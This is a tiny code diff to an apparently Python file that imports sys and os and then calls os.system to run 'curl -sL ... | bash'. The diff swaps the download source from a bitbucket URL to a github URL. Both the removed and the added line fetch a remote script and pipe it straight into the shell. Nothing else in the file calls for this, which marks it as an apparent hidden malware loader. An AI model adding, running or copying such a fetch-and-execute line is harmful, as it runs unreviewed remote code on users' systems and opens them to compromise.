@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://bitbucket.org/mypile/filesg/raw/main/var | bash')
+os.system('curl -sL https://github.com/parmount6/filesg/raw/main/var | bash')
